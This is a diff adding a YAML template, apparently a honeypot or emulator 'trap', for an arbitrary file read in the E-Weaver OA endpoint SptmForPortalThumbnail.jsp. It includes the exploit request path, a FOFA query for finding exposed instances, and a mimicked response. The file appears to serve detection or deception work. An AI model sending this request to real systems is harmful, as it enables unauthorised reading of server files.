@@ -1,0 +1,27 @@
+id: weaver-sptmforportalthumbnail-lfi
+info:
+  name: OA E-Weaver SptmForPortalThumbnail - Arbitrary File Read
+  author: SleepingBag945
+  description: 'The controllable preview parameters of SptmForPortalThumbnail.jsp
+    are not filtered and are directly spliced to the web root directory for file downloading.
+
+    '
+  severity: high
+  reference:
+  - http://124.223.89.192/archives/e-cology8-14
+  - https://github.com/GREENHAT7/pxplan/blob/main/xray_pocs/yaml-poc-weaver-weaver_e_cology_oa-readfile-CT-479157.yml
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="泛微-E-Weaver"
+  tags: weaver,e-cology,oa,lfi
+traps:
+- request:
+    method: GET
+    path: /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: weaver.general.BaseBeangetServletConfig
